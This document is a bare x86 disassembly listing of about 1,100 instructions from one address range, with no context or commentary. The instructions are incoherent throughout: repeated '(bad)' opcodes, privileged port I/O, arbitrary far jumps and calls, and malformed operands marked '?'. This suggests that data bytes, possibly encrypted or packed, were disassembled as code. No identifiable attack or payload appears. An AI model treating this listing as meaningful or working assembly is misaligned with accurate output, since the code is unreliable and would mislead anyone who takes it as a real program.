  40ea85:	pop    ecx
  40ea86:	mov    ch,0x46
  40ea88:	add    al,0x4
  40ea8a:	sbb    esp,DWORD PTR [eax]
  40ea8c:	sti    
  40ea8d:	dec    ecx
  40ea8e:	jmp    0x65b7d20
  40ea93:	mov    al,ds:0x9772b3d3
  40ea98:	mov    cl,0xf5
  40ea9a:	adc    BYTE PTR [ecx+eiz*4],dh
  40ea9d:	rcr    DWORD PTR ds:0xd1704ab9,1
  40eaa3:	into   
  40eaa4:	mov    esp,0xdec06b63
  40eaa9:	in     al,dx
  40eaaa:	test   BYTE PTR [eax-0x1c636f7e],dh
  40eab0:	xor    ebp,edx
  40eab2:	aaa    
  40eab3:	repz rcr BYTE PTR [eax+0x442bd44b],1
  40eaba:	popf   
  40eabb:	dec    edx
  40eabc:	sub    eax,0x255f8b6f
  40eac1:	lods   al,BYTE PTR ds:[esi]
  40eac2:	push   ecx
  40eac3:	dec    eax
  40eac4:	or     ebx,DWORD PTR [edi]
  40eac6:	les    ebx,FWORD PTR [eax-0x9f09c7f]
  40eacc:	out    0x73,eax
  40eace:	mov    al,0xf2
  40ead0:	mov    eax,0x592735c7
  40ead5:	std    
  40ead6:	sbb    BYTE PTR [edi-0x1e],dl
  40ead9:	inc    ebx
  40eada:	add    DWORD PTR [ebx+0x7d26dd1f],ebp
  40eae0:	pop    es
  40eae1:	in     al,0x58
  40eae3:	inc    ebx
  40eae4:	adc    dh,BYTE PTR [edx-0x173f4994]
  40eaea:	dec    esi
  40eaeb:	add    edi,esp
  40eaed:	leave  
  40eaee:	fwait
  40eaef:	clc    
  40eaf0:	xor    eax,0xdfdddd8d
  40eaf5:	cwde   
  40eaf6:	push   esi
  40eaf7:	hlt    
  40eaf8:	ins    BYTE PTR es:[edi],dx
  40eaf9:	and    al,0xa
  40eafb:	push   cs
  40eafc:	cmc    
  40eafd:	adc    al,0xed
  40eaff:	pushf  
  40eb00:	jo     0x40eabf
  40eb02:	push   ebx
  40eb03:	pop    ds
  40eb04:	inc    esp
  40eb05:	in     eax,0x69
  40eb07:	xchg   edx,eax
  40eb08:	jecxz  0x40eacf
  40eb0a:	dec    esi
  40eb0b:	dec    ebp
  40eb0c:	sub    eax,0x8f91f6b1
  40eb11:	sub    al,0x60
  40eb13:	mov    BYTE PTR [esi+ebp*4-0x19],cl
  40eb17:	pop    edi
  40eb18:	pusha  
  40eb19:	pop    esp
  40eb1a:	and    BYTE PTR [edi+0x31],0x45
  40eb1e:	push   0xffffffae
  40eb20:	mov    ebx,0x7db7b88a
  40eb25:	test   al,0xb8
  40eb27:	sahf   
  40eb28:	push   esp
  40eb29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb2a:	pop    es
  40eb2b:	lea    eax,[edi+eiz*4]
  40eb2e:	test   ebp,ebp
  40eb30:	dec    si
  40eb32:	push   cs
  40eb33:	lods   eax,DWORD PTR ds:[esi]
  40eb34:	popa   
  40eb35:	setnp  BYTE PTR [edi]
  40eb38:	xchg   esp,eax
  40eb39:	push   ds
  40eb3a:	(bad)  
  40eb3b:	jmp    0xc4bb33a1
  40eb40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb41:	scas   al,BYTE PTR es:[edi]
  40eb42:	or     ecx,DWORD PTR [ebp+0x50]
  40eb45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb46:	mov    ds:0x59435e70,al
  40eb4b:	xchg   ecx,eax
  40eb4c:	rol    DWORD PTR [esi-0x7a],0x41
  40eb50:	jge    0x40eb69
  40eb52:	fwait
  40eb53:	hlt    
  40eb54:	ins    DWORD PTR es:[edi],dx
  40eb55:	pop    ebp
  40eb56:	jb     0x40ebd3
  40eb58:	repnz popa 
  40eb5a:	addr16 jbe 0x40eb6d
  40eb5d:	or     al,0x84
  40eb5f:	ffreep st(5)
  40eb61:	pop    eax
  40eb62:	pop    ds
  40eb63:	or     eax,0x7d299379
  40eb68:	popf   
  40eb69:	jge    0x40eb16
  40eb6b:	nop
  40eb6c:	int3   
  40eb6d:	dec    ebx
  40eb6e:	iret   
  40eb6f:	pop    ebx
  40eb70:	add    DWORD PTR [esi+0x15],ebp
  40eb73:	fisttp QWORD PTR [esi+0xa]
  40eb76:	add    ecx,DWORD PTR [edi-0x121d79af]
  40eb7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb7d:	bound  eax,QWORD PTR [edx+0x41]
  40eb80:	es sub eax,0xec6dd5fc
  40eb86:	mov    edi,0xae207a2e
  40eb8b:	sbb    DWORD PTR [esp+edx*4-0x7925c3a2],ecx
  40eb92:	sbb    BYTE PTR [esi+0x43],al
  40eb95:	sub    eax,0xa6765d4f
  40eb9a:	bound  ecx,QWORD PTR [edi+0x7f]
  40eb9d:	test   al,0x4c
  40eb9f:	jle    0x40ebe4
  40eba1:	cmc    
  40eba2:	je     0x40ebdf
  40eba4:	in     al,0xa4
  40eba6:	inc    esi
  40eba7:	sbb    al,0x74
  40eba9:	retf   0xc6e6
  40ebac:	inc    esi
  40ebad:	jbe    0x40ebd9
  40ebaf:	int    0xc3
  40ebb1:	dec    esi
  40ebb2:	sub    BYTE PTR [ecx],cl
  40ebb4:	lahf   
  40ebb5:	or     cl,BYTE PTR [edx-0xb9d58d]
  40ebbb:	into   
  40ebbc:	inc    eax
  40ebbd:	test   dl,dl
  40ebbf:	xchg   DWORD PTR [ebp+0x33],edx
  40ebc2:	xchg   edi,eax
  40ebc3:	jl     0x40eb96
  40ebc5:	fs xchg ebp,eax
  40ebc7:	clc    
  40ebc8:	xor    al,0xe6
  40ebca:	scas   al,BYTE PTR es:[edi]
  40ebcb:	mov    bl,0xda
  40ebcd:	mov    WORD PTR [ecx+0x771d7aa7],es
  40ebd3:	mov    ds:0x8ec2548f,eax
  40ebd8:	or     eax,0x293b80f5
  40ebdd:	xchg   edx,eax
  40ebde:	or     al,0x12
  40ebe0:	scas   al,BYTE PTR es:[edi]
  40ebe1:	push   esp
  40ebe2:	cwde   
  40ebe3:	leave  
  40ebe4:	xlat   BYTE PTR ds:[ebx]
  40ebe5:	xor    DWORD PTR [ebx-0xd931a7d],ecx
  40ebeb:	out    0xa2,eax
  40ebed:	jne    0x40ec56
  40ebef:	loop   0x40ebb0
  40ebf1:	cmp    ecx,DWORD PTR [ecx]
  40ebf3:	xor    DWORD PTR ds:0xe32108e,edx
  40ebf9:	jnp    0x40eba6
  40ebfb:	or     al,0x9d
  40ebfd:	or     BYTE PTR [edx+0x2d],dh
  40ec00:	inc    ebx
  40ec01:	fs push ds
  40ec03:	adc    ebx,DWORD PTR [edx-0xa47339e]
  40ec09:	adc    al,0xca
  40ec0b:	xchg   ebx,eax
  40ec0c:	rol    cl,1
  40ec0e:	inc    ebp
  40ec0f:	scas   eax,DWORD PTR es:[edi]
  40ec10:	loop   0x40ec8e
  40ec12:	(bad)  
  40ec14:	lahf   
  40ec15:	adc    ebp,ecx
  40ec17:	sub    dh,BYTE PTR [esi+0x5c883b9e]
  40ec1d:	jg     0x40ebac
  40ec1f:	push   ecx
  40ec20:	scas   eax,DWORD PTR es:[edi]
  40ec21:	out    dx,eax
  40ec22:	(bad)  
  40ec24:	imul   ebp,DWORD PTR [esi],0x4b
  40ec27:	leave  
  40ec28:	and    BYTE PTR [edi+0x666fe969],bh
  40ec2e:	mov    WORD PTR [edi+0x58],ds
  40ec31:	mov    al,ds:0xc1c75024
  40ec36:	hlt    
  40ec37:	inc    edi
  40ec38:	rol    esp,1
  40ec3a:	mov    al,0xf8
  40ec3c:	jb     0x40ec9a
  40ec3e:	gs pop edi
  40ec40:	mov    ecx,0xd6423dcb
  40ec45:	adc    BYTE PTR [ecx],dh
  40ec47:	mov    ds:0xb114a0bd,al
  40ec4c:	fiadd  WORD PTR [edi-0x6c]
  40ec4f:	mov    esi,0xa1032f0c
  40ec54:	stc    
  40ec55:	rcl    BYTE PTR [eax-0x1957f6b4],cl
  40ec5b:	pop    edx
  40ec5c:	cmp    al,0xe8
  40ec5e:	mov    ?,WORD PTR [ecx]
  40ec60:	loope  0x40ec08
  40ec62:	dec    ecx
  40ec63:	push   eax
  40ec64:	adc    cl,bh
  40ec66:	cmp    BYTE PTR [esi+0x52f84d83],bl
  40ec6c:	je     0x40ecc1
  40ec6e:	div    DWORD PTR ds:[edx-0x36c90003]
  40ec75:	repnz push cs
  40ec77:	mov    al,0xf4
  40ec79:	cmp    BYTE PTR [ebx+edx*2+0x43d3a7ef],dh
  40ec80:	(bad)  [edx+0x4b]
  40ec83:	stos   DWORD PTR es:[edi],eax
  40ec84:	dec    ebx
  40ec85:	add    al,0x62
  40ec87:	xor    BYTE PTR [edx],dh
  40ec89:	jae    0x40ec15
  40ec8b:	mov    al,ds:0xe21cb51a
  40ec90:	dec    ebx
  40ec91:	sbb    DWORD PTR [edi+0x4622682a],ecx
  40ec97:	cmp    edx,DWORD PTR [eax]
  40ec99:	xchg   ebp,eax
  40ec9a:	scas   eax,DWORD PTR es:[edi]
  40ec9b:	cmp    eax,0x313d3d09
  40eca0:	push   ss
  40eca1:	icebp  
  40eca2:	pusha  
  40eca3:	xor    al,0x8
  40eca5:	out    0xea,al
  40eca7:	push   cs
  40eca8:	retf   
  40eca9:	cld    
  40ecaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecab:	mov    ebx,0xcdd088ff
  40ecb0:	test   BYTE PTR [edi-0x6b],0x24
  40ecb4:	fcomp  DWORD PTR ds:0x6c627a28
  40ecba:	and    BYTE PTR [ebp-0x4a15fb71],dl
  40ecc0:	or     cl,cl
  40ecc2:	push   ecx
  40ecc3:	and    cl,BYTE PTR [ecx]
  40ecc5:	sbb    BYTE PTR [ebx+0x28f2d0fb],dl
  40eccb:	dec    esp
  40eccc:	push   esi
  40eccd:	(bad)  
  40ecce:	xchg   si,ax
  40ecd0:	add    al,0x8b
  40ecd2:	mov    bh,0x28
  40ecd4:	cmp    ebp,DWORD PTR [ebx-0x40e02fcb]
  40ecda:	mov    eax,0x37c8d664
  40ecdf:	pop    ss
  40ece0:	push   es
  40ece1:	add    ax,0x7bc8
  40ece5:	mov    edi,0x8f1b79f4
  40ecea:	mov    ?,WORD PTR [edx+0x1ee55842]
  40ecf0:	mov    WORD PTR [ebx+edi*1+0x23],?
  40ecf4:	add    edi,DWORD PTR [edi+eiz*8-0x24829db3]
  40ecfb:	push   ds
  40ecfc:	xchg   DWORD PTR ds:0x3ac0307,esi
  40ed02:	jno    0x40ed3e
  40ed04:	adc    BYTE PTR [edx-0x512032af],dl
  40ed0a:	or     eax,ebp
  40ed0c:	out    0xc4,al
  40ed0e:	xchg   ecx,eax
  40ed0f:	lahf   
  40ed10:	adc    DWORD PTR [ebx+ebp*8],0x1321353a
  40ed17:	push   ds
  40ed18:	fs call 0xc46372ce
  40ed1e:	mov    ebp,0xaa40da18
  40ed23:	and    eax,0x75dc056d
  40ed28:	jns    0x40ed02
  40ed2a:	fsub   QWORD PTR [edi-0x4a]
  40ed2d:	in     eax,0xc4
  40ed2f:	jmp    0xe8cbd34f
  40ed34:	inc    esp
  40ed35:	push   ebx
  40ed36:	xor    ch,BYTE PTR [edx+0x30]
  40ed39:	fld    st(5)
  40ed3b:	cmp    al,dl
  40ed3d:	xchg   edi,eax
  40ed3f:	jmp    0xc5610292
  40ed44:	ss into 
  40ed46:	(bad)  
  40ed47:	test   BYTE PTR [esi+0x3a527e0b],0x27
  40ed4e:	dec    edx
  40ed4f:	add    al,0xf1
  40ed51:	sbb    al,0xdc
  40ed53:	mov    ds:0xcf885a16,al
  40ed58:	andnps xmm5,XMMWORD PTR [edx+0x75]
  40ed5c:	push   edi
  40ed5d:	ret    0xe4e9
  40ed60:	int    0x14
  40ed62:	mov    ds:0x1a03e253,al
  40ed67:	aam    0x8a
  40ed69:	ror    DWORD PTR [edx],1
  40ed6b:	lods   al,BYTE PTR ds:[esi]
  40ed6c:	stc    
  40ed6d:	ins    DWORD PTR es:[edi],dx
  40ed6e:	xor    DWORD PTR [ebx+0x4f],0x75116544
  40ed75:	jbe    0x40edc5
  40ed77:	mov    esp,0x296f393c
  40ed7c:	loop   0x40edf3
  40ed7e:	jge    0x40ed00
  40ed80:	mov    bh,0x0
  40ed82:	retf   0xf2c6
  40ed85:	mov    dl,0x63
  40ed87:	jge    0x40ed9f
  40ed89:	mov    ds:0x17709a84,al
  40ed8e:	push   0xa5d8f4e5
  40ed93:	sbb    eax,0x2717dd09
  40ed98:	mov    WORD PTR [edi],cs
  40ed9a:	jl     0x40ed82
  40ed9c:	lods   al,BYTE PTR ds:[esi]
  40ed9d:	mov    edx,0x32e88e1c
  40eda2:	xor    DWORD PTR [edi+0x45],ecx
  40eda5:	adc    eax,0x84995e5f
  40edaa:	(bad)  
  40edab:	pop    esi
  40edac:	jno    0x40ee23
  40edae:	pop    edi
  40edaf:	pop    es
  40edb0:	jmp    0x40ed4b
  40edb2:	mov    cl,0xd
  40edb4:	xchg   edx,eax
  40edb5:	fdiv   DWORD PTR [edx+0xb]
  40edb8:	inc    edx
  40edb9:	dec    ecx
  40edba:	adc    al,0xf7
  40edbc:	ja     0x40eda8
  40edbe:	and    bh,BYTE PTR [eax+eax*2+0x7eaae44f]
  40edc5:	nop
  40edc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edc7:	call   0x62e4:0xbaeb4697
  40edce:	leave  
  40edcf:	loope  0x40edd3
  40edd1:	cmp    DWORD PTR [esi+0x306cf66f],ebx
  40edd7:	and    eax,ebx
  40edd9:	sar    DWORD PTR [ebp-0x7e6d55d4],cl
  40eddf:	mov    ah,0x13
  40ede1:	push   es
  40ede2:	jl     0x40ee5f
  40ede4:	xchg   ebp,eax
  40ede5:	rcl    DWORD PTR [esi],cl
  40ede7:	cmp    edi,eax
  40ede9:	ror    BYTE PTR [esi+0xb],cl
  40edec:	jae    0x40edc7
  40edee:	fsubr  DWORD PTR [eax]
  40edf0:	and    al,0x8f
  40edf2:	jg     0x40ee52
  40edf4:	adc    DWORD PTR [esi-0x762db7ea],0x414eacd9
  40edfe:	call   0x417ece18
  40ee03:	jbe    0x40edd4
  40ee05:	fstp   QWORD PTR [esi+0x544c330c]
  40ee0b:	je     0x40ee05
  40ee0d:	mov    al,ds:0x21b73b0c
  40ee12:	ds xchg edx,eax
  40ee14:	push   ds
  40ee15:	xchg   esi,eax
  40ee16:	jecxz  0x40ee4f
  40ee18:	aaa    
  40ee19:	outs   dx,BYTE PTR ds:[esi]
  40ee1a:	adc    DWORD PTR [esi+0x79],eax
  40ee1d:	aam    0x96
  40ee1f:	xchg   edx,eax
  40ee20:	cld    
  40ee21:	jp     0x40ee04
  40ee23:	fsubr  st,st(6)
  40ee25:	xor    eax,0x3517c546
  40ee2a:	or     esi,DWORD PTR [edi+0x10]
  40ee2d:	mov    esi,0x42b74b8f
  40ee32:	xchg   ecx,eax
  40ee33:	jno    0x40ee7e
  40ee35:	cmc    
  40ee36:	and    DWORD PTR [edx-0x32],edi
  40ee39:	notrack call DWORD PTR [ecx-0x258adc20]
  40ee40:	and    DWORD PTR [edx],ebx
  40ee42:	xor    eax,0xb03b6f19
  40ee47:	addr16 jg 0x40ee7d
  40ee4a:	inc    ecx
  40ee4b:	push   ebp
  40ee4c:	stc    
  40ee4d:	or     DWORD PTR [esi+0x49940f89],ebp
  40ee53:	ret    0x9d30
  40ee56:	in     eax,0x9b
  40ee58:	ror    dl,cl
  40ee5a:	push   esp
  40ee5b:	in     al,dx
  40ee5c:	add    eax,0x37cd4696
  40ee61:	pusha  
  40ee62:	retf   
  40ee63:	inc    esi
  40ee64:	in     al,dx
  40ee65:	test   al,0xf5
  40ee67:	sbb    al,0xbf
  40ee69:	rol    BYTE PTR [eax+0x44],1
  40ee6c:	clc    
  40ee6d:	jae    0x40eec7
  40ee6f:	sub    al,0xf4
  40ee71:	fsubr  st(7),st
  40ee73:	imul   ecx,DWORD PTR ds:0x4af56d1e,0x45ac9b4d
  40ee7d:	mov    dh,0x7c
  40ee7f:	add    bl,BYTE PTR [esi+0x54]
  40ee82:	sbb    DWORD PTR [ebp+0x4e],esp
  40ee85:	push   es
  40ee86:	cmp    ebp,esi
  40ee88:	gs (bad) 
  40ee8a:	jno    0x40eeac
  40ee8c:	std    
  40ee8d:	sbb    bh,BYTE PTR [ebx]
  40ee8f:	and    eax,0x93aed24e
  40ee94:	lods   al,BYTE PTR ds:[esi]
  40ee95:	and    al,0x15
  40ee97:	test   eax,0xe945b705
  40ee9c:	into   
  40ee9d:	push   eax
  40ee9e:	dec    edi
  40ee9f:	sbb    eax,0x8362c060
  40eea4:	loop   0x40eec4
  40eea6:	fs inc esi
  40eea8:	push   esp
  40eea9:	jb     0x40eeef
  40eeab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeac:	mov    ecx,0xe0b860e3
  40eeb1:	mov    dh,dl
  40eeb3:	sub    al,bh
  40eeb5:	dec    edi
  40eeb6:	jmp    0x571d:0x9c902742
  40eebd:	mov    ecx,0xdb28d6a0
  40eec2:	xchg   edi,eax
  40eec3:	lahf   
  40eec4:	hlt    
  40eec5:	repz pop ecx
  40eec7:	shr    DWORD PTR [eax-0x76],1
  40eeca:	cld    
  40eecb:	mov    ds:0xce5eafad,eax
  40eed0:	inc    esi
  40eed1:	pop    ecx
  40eed2:	dec    edi
  40eed3:	mov    eax,ds:0x66ad90e
  40eed8:	mov    ds:0x70b3dc7d,al
  40eedd:	mov    bh,0xd5
  40eedf:	mov    ecx,0xcbd62554
  40eee4:	stc    
  40eee5:	dec    esi
  40eee6:	aaa    
  40eee7:	mov    dh,BYTE PTR [bx+0x72a7]
  40eeec:	fidiv  DWORD PTR ds:0x80a4e31c
  40eef2:	cmp    BYTE PTR [esi+0x68],bl
  40eef5:	mov    ebp,0xcca0673c
  40eefa:	out    dx,eax
  40eefb:	mov    bl,0x85
  40eefd:	(bad)  
  40eefe:	xor    ecx,eax
  40ef00:	ret    0xedd5
  40ef03:	out    0x22,eax
  40ef05:	and    dh,bl
  40ef07:	lock (bad) 
  40ef09:	xchg   ecx,eax
  40ef0a:	mov    edx,0xa0b584c9
  40ef0f:	adc    ch,BYTE PTR [edi-0x62]
  40ef12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef13:	inc    ebp
  40ef14:	stos   DWORD PTR es:[edi],eax
  40ef15:	imul   ecx,ebp,0x8697044f
  40ef1b:	mov    ebx,0x5236290c
  40ef20:	cli    
  40ef21:	xchg   ebx,eax
  40ef22:	push   ss
  40ef23:	dec    edx
  40ef24:	fcom   QWORD PTR [edx+0x4bf33b95]
  40ef2a:	sbb    DWORD PTR [ecx+0x49],ebp
  40ef2d:	lods   al,BYTE PTR ds:[esi]
  40ef2e:	pop    ds
  40ef2f:	mov    al,0xd2
  40ef31:	mov    eax,?
  40ef33:	mov    DWORD PTR [eax+0x6e],esi
  40ef36:	imul   eax,DWORD PTR [edi+0x265098db],0xd36ef39f
  40ef40:	sub    eax,0x1f
  40ef43:	xor    bh,BYTE PTR [edx]
  40ef45:	add    dl,BYTE PTR [ebx+0x601c5bad]
  40ef4b:	jae    0x40ef67
  40ef4d:	dec    eax
  40ef4e:	jns    0x40ef57
  40ef50:	(bad)  
  40ef51:	jae    0x40ef0c
  40ef53:	outs   dx,BYTE PTR ds:[esi]
  40ef54:	xlat   BYTE PTR ds:[ebx]
  40ef55:	icebp  
  40ef56:	sbb    DWORD PTR [edx],ecx
  40ef58:	bound  eax,QWORD PTR [eax]
  40ef5a:	sub    bh,bl
  40ef5c:	enter  0x9a3,0x84
  40ef60:	std    
  40ef61:	data16 cmp dl,BYTE PTR [ebp-0x1e]
  40ef65:	mov    bh,0x35
  40ef67:	shr    BYTE PTR [ebp-0x8],1
  40ef6a:	ret    
  40ef6b:	add    DWORD PTR [eax],0x25
  40ef6e:	push   esp
  40ef6f:	das    
  40ef70:	and    ebp,DWORD PTR [esi+0x40573cdb]
  40ef76:	dec    ebx
  40ef77:	mov    ebx,0xb6cfaff0
  40ef7c:	xor    ah,dl
  40ef7e:	mov    esp,edi
  40ef80:	jle    0x40ef76
  40ef82:	sub    esi,DWORD PTR [ecx+0x25498ba8]
  40ef88:	pop    esp
  40ef89:	pop    ss
  40ef8a:	loope  0x40eff4
  40ef8c:	stos   DWORD PTR es:[edi],eax
  40ef8d:	in     eax,0x0
  40ef8f:	clc    
  40ef90:	ins    BYTE PTR es:[edi],dx
  40ef91:	dec    ebx
  40ef92:	popa   
  40ef93:	mov    eax,0xe5097ce6
  40ef98:	cmp    al,0xc
  40ef9a:	mov    edi,0xf83da1e3
  40ef9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efa0:	fld    TBYTE PTR [ebx]
  40efa2:	(bad)  
  40efa3:	cmp    al,BYTE PTR [edx+0x77527410]
  40efa9:	pop    ds
  40efaa:	daa    
  40efab:	mov    ebx,0xf4fc87ec
  40efb0:	or     bl,cl
  40efb2:	jmp    0x911c6fb0
  40efb7:	and    al,0x42
  40efb9:	fidivr WORD PTR [ebx-0x6ebc32af]
  40efbf:	daa    
  40efc0:	dec    edi
  40efc1:	call   0xb415:0xbbccc088
  40efc8:	ins    DWORD PTR es:[edi],dx
  40efc9:	xchg   esp,eax
  40efca:	xchg   ebx,eax
  40efcb:	in     al,dx
  40efcc:	pop    eax
  40efcd:	scas   al,BYTE PTR es:[edi]
  40efce:	nop
  40efcf:	jle    0x40ef55
  40efd1:	and    DWORD PTR [esi+0x6c],esi
  40efd4:	shr    BYTE PTR [ecx+0x9],0x76
  40efd8:	icebp  
  40efd9:	mov    dh,BYTE PTR [edi]
  40efdb:	gs and eax,0xa1b181ba
  40efe1:	xor    dl,dl
  40efe3:	adc    DWORD PTR [edx+edx*2],ecx
  40efe6:	test   DWORD PTR [ecx+0x13],edx
  40efe9:	inc    ebx
  40efea:	cs ret 
  40efec:	mov    bl,0x9a
  40efee:	sti    
  40efef:	(bad)  
  40eff0:	ds scas eax,DWORD PTR es:[edi]
  40eff2:	stos   BYTE PTR es:[edi],al
  40eff3:	and    BYTE PTR [esi],cl
  40eff5:	xor    esi,esi
  40eff7:	stos   BYTE PTR es:[edi],al
  40eff8:	push   0xffffffc3
  40effa:	loop   0x40f017
  40effc:	dec    edi
  40effd:	mov    ds:0x50c2fbea,eax
  40f002:	pop    edx
  40f003:	(bad)  
  40f004:	pop    ebx
  40f005:	sbb    eax,0xa6a9364f
  40f00a:	outs   dx,DWORD PTR ds:[esi]
  40f00b:	xchg   edx,eax
  40f00c:	pushf  
  40f00d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f00e:	in     eax,0xe
  40f010:	jns    0x40eff0
  40f012:	scas   eax,DWORD PTR es:[edi]
  40f013:	mov    al,0x74
  40f015:	iret   
  40f016:	sub    DWORD PTR [ecx],esi
  40f018:	sub    edx,DWORD PTR [ebx+0x47]
  40f01b:	and    edx,DWORD PTR [ecx-0x73c75f88]
  40f021:	and    BYTE PTR [eax+0x7c],ch
  40f024:	loop   0x40efc4
  40f026:	pop    ecx
  40f027:	outs   dx,BYTE PTR ds:[esi]
  40f028:	in     al,0x5f
  40f02a:	adc    DWORD PTR [edi],ebx
  40f02c:	mov    ds:0x7bdabf0b,al
  40f031:	adc    DWORD PTR [eax],0xffffffeb
  40f034:	jle    0x40f013
  40f036:	jmp    0xa759:0xf6c03e37
  40f03d:	lods   eax,DWORD PTR ds:[esi]
  40f03e:	ret    0xcd10
  40f041:	push   0xe9b0df76
  40f046:	ret    
  40f047:	pop    ss
  40f048:	retf   0x7f3e
  40f04b:	add    edi,DWORD PTR [ecx+eiz*1-0x8]
  40f04f:	inc    eax
  40f050:	push   cs
  40f051:	sahf   
  40f052:	jnp    0x40f046
  40f054:	mov    eax,ds:0xbe4188a3
  40f059:	lods   al,BYTE PTR ds:[esi]
  40f05a:	(bad)  [eax]
  40f05c:	jne    0x40f046
  40f05e:	sub    BYTE PTR [edi+0x4a],ch
  40f061:	sub    ecx,edx
  40f063:	add    BYTE PTR [esi-0x30d6d0b0],0xc
  40f06a:	mov    fs,WORD PTR [ebp+eiz*2+0x7a]
  40f06e:	popa   
  40f06f:	xchg   bh,dh
  40f071:	test   eax,0x4da14f48
  40f076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f077:	xchg   esp,eax
  40f078:	fnstsw ax
  40f07a:	inc    ecx
  40f07b:	cs pop ecx
  40f07d:	rol    DWORD PTR [eax+0x4d],1
  40f080:	jnp    0x40f018
  40f082:	xchg   esp,eax
  40f083:	enter  0x9b88,0xf1
  40f087:	xlat   BYTE PTR ds:[ebx]
  40f088:	fist   DWORD PTR ss:[ebp+0x42a34dc1]
  40f08f:	dec    esi
  40f090:	nop
  40f091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f092:	je     0x40f02d
  40f094:	icebp  
  40f095:	mov    bl,0x67
  40f097:	mov    ebx,0xf2110d16
  40f09c:	or     DWORD PTR [edi],esp
  40f09e:	jb     0x40f027
  40f0a0:	pop    ebp
  40f0a1:	popf   
  40f0a2:	and    cl,dh
  40f0a4:	mov    al,BYTE PTR [ecx-0x60]
  40f0a7:	jecxz  0x40f059
  40f0a9:	mov    dl,0xc5
  40f0ab:	enter  0xf8ef,0x90
  40f0af:	es push edx
  40f0b1:	xchg   edi,eax
  40f0b2:	mov    BYTE PTR [ebx],ch
  40f0b4:	ret    
  40f0b5:	xchg   ecx,eax
  40f0b6:	shl    BYTE PTR [esi+0x22eefde7],cl
  40f0bc:	ret    
  40f0bd:	xchg   ebp,eax
  40f0be:	adc    al,0x74
  40f0c0:	addr16 push edi
  40f0c2:	mov    eax,ds:0x7901f452
  40f0c7:	pop    ss
  40f0c8:	mov    bl,0xe5
  40f0ca:	push   es
  40f0cb:	push   esp
  40f0cc:	arpl   WORD PTR ds:0xdf964aa3,si
  40f0d2:	jne    0x40f0db
  40f0d4:	es jno 0x40f06b
  40f0d7:	mov    esp,db0
  40f0da:	pushf  
  40f0db:	inc    ebx
  40f0dc:	(bad)  
  40f0dd:	in     eax,dx
  40f0de:	jne    0x40f10a
  40f0e0:	pop    edx
  40f0e1:	lds    esp,FWORD PTR [edx]
  40f0e3:	jb     0x40f14b
  40f0e5:	jge    0x40f0b1
  40f0e7:	int    0x1f
  40f0e9:	inc    ebx
  40f0ea:	loop   0x40f083
  40f0ec:	adc    dl,ah
  40f0ee:	aaa    
  40f0ef:	pop    edi
  40f0f0:	sub    dl,BYTE PTR [ecx]
  40f0f2:	pop    ecx
  40f0f3:	scas   al,BYTE PTR es:[edi]
  40f0f4:	mov    dh,0xdf
  40f0f6:	mov    ds:0x27bb6488,eax
  40f0fb:	call   0x47c698ce
  40f100:	jmp    0x5528:0xc1f243ec
  40f107:	add    eax,0xb7ef9bdf
  40f10c:	jle    0x40f128
  40f10e:	out    dx,al
  40f10f:	leave  
  40f110:	mov    ch,0xa2
  40f112:	test   DWORD PTR [ebx+0x36e1e2ac],ebp
  40f118:	add    bh,cl
  40f11a:	lds    ecx,FWORD PTR [eax+0x66d7e12e]
  40f120:	js     0x40f0e4
  40f122:	in     eax,0xa7
  40f124:	int    0x2e
  40f126:	jne    0x40f13a
  40f128:	cmp    DWORD PTR [edx-0x13fcfd0b],ebx
  40f12e:	sub    DWORD PTR [ebx],ebp
  40f130:	and    ah,BYTE PTR [ebp+0x3e6919fe]
  40f136:	mov    al,ds:0x5d437033
  40f13b:	sbb    al,0xef
  40f13d:	push   0x8afedb94
  40f142:	jmp    0xb6c9:0xe231a6cd
  40f149:	fcmovnbe st,st(2)
  40f14b:	pop    ss
  40f14c:	jp     0x40f194
  40f14e:	loope  0x40f19b
  40f150:	popa   
  40f151:	jp     0x40f0d5
  40f153:	arpl   WORD PTR ds:[esi+0x523752ae],dx
  40f15a:	mov    BYTE PTR [edi],ch
  40f15c:	inc    ebx
  40f15d:	jecxz  0x40f16d
  40f15f:	xor    al,0xc5
  40f161:	sbb    esp,DWORD PTR [ebx-0x3a]
  40f164:	cmp    bh,BYTE PTR [edx-0x31c99aee]
  40f16a:	cs ret 
  40f16c:	xchg   esi,eax
  40f16d:	ror    dh,1
  40f16f:	repz ror DWORD PTR [esi-0x45],1
  40f173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f174:	inc    ecx
  40f175:	xor    eax,0xbc16239c
  40f17a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f17b:	lahf   
  40f17c:	into   
  40f17d:	popf   
  40f17e:	loopne 0x40f1db
  40f180:	xor    bl,dh
  40f182:	icebp  
  40f183:	into   
  40f184:	mov    edx,0x22abff59
  40f189:	cli    
  40f18a:	pop    esi
  40f18b:	test   DWORD PTR [esi-0x5e],0xbed2bbc5
  40f192:	stos   DWORD PTR es:[edi],eax
  40f193:	loop   0x40f15c
  40f195:	adc    bl,0xb9
  40f198:	jno    0x40f129
  40f19a:	mov    cl,0x97
  40f19c:	lds    ebx,FWORD PTR [edx]
  40f19e:	retf   0xe93d
  40f1a1:	lods   eax,DWORD PTR ds:[esi]
  40f1a2:	test   eax,0xd82e128c
  40f1a7:	xlat   BYTE PTR ds:[ebx]
  40f1a8:	xor    al,0x23
  40f1aa:	cmp    edi,DWORD PTR [ebx+eiz*4+0xa0780bc]
  40f1b1:	mov    bl,0x1b
  40f1b3:	sbb    esp,eax
  40f1b5:	in     al,dx
  40f1b6:	sbb    dh,BYTE PTR [ecx+0x5ba05c1a]
  40f1bc:	adc    eax,0xc6aabfae
  40f1c1:	mov    ds:0x37407273,al
  40f1c6:	pop    ds
  40f1c7:	lea    ebx,[edx+0x562a60f9]
  40f1cd:	iret   
  40f1ce:	inc    eax
